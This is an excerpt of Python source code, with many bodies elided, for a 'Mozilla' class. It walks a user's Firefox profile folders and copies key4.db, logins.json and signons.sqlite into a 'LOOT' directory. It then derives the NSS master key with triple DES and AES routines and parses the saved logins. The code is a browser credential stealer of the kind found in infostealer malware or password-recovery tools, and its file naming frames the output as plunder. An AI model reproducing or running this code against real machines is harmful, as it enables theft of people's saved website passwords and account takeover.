...
from crypto.pyDes import triple_des, CBC
from crypto.pyaes import AESModeOfOperationCBC
...
class Mozilla():
    ...
    def __init__(self):
        self.path = "%AppData%/Mozilla/Firefox"
    ...
    def get_key(self, profile):
        ...
        try:
            ...
            with open('LOOT\\'+profile+'\\key4.db', 'rb') as f:
                content = f.read()

            if content:
                conn = sqlite3.connect('LOOT\\'+profile+'\\key4.db')  # Firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
                c = conn.cursor()
                ...
                if global_salt:
                    try:
                        ...
                        if a102 == CKA_ID:
                            ...
                            if key:
                                print(u'key: {key}'.format(key=repr(key)))
                                yield key[:24]
                        # else:
                            # Nothing saved
    ...
    def get_login_data(self, profile):
        ...
        """
        sqldata = 'LOOT\\'+profile+'\\signons.sqlite'
        ...
        try:
            ...
            try:
                logins_json = 'LOOT\\'+profile+'\\logins.json'
                    ...
                    with open(logins_json) as f:
                        ...
                        if loginf:
                            ...
                            if 'logins' not in json_logins:
                                print('No logins key in logins.json')
                                return logins
    ...
    def manage_masterpassword(self, master_password=b'', key_data=None, new_version=True):
        ...
        # if not global_salt:
        #     print(u'Master Password is used !')
    ...
    def run(self):
        ...
        DIR = os.getenv('APPDATA') + "\Mozilla\Firefox\profiles"
        try:
          for path, directories, files in os.walk(DIR):
            for dir in directories:
              if ".default" in dir:
                if not os.path.exists("LOOT/" + dir):
                  os.mkdir("LOOT/" + dir)
            for file in files:
              for x in path.split("\\"):
                if ".default" in x:
                  dir = x
              if "key" in file and ".db" in file:
                    print("LOOT/"+dir+"/"+file)
                    shutil.copyfile(os.path.join(path, file), "LOOT/"+dir+"/"+file)
              if "logins.json" in file:
                    print("LOOT/"+dir+"/"+file)
                    shutil.copyfile(os.path.join(path, file), "LOOT/"+dir+"/"+file)
              if "signons.sqlite" in file:
                    print("LOOT/"+dir+"/"+file)
                    shutil.copyfile(os.path.join(path, file), "LOOT/"+dir+"/"+file)
        except:
          exit()

        for (p, d, f) in os.walk("LOOT/"):
          for path in d:
            path2 = "LOOT/" + path + "/"
            pwd_found = []
            self.path = path2
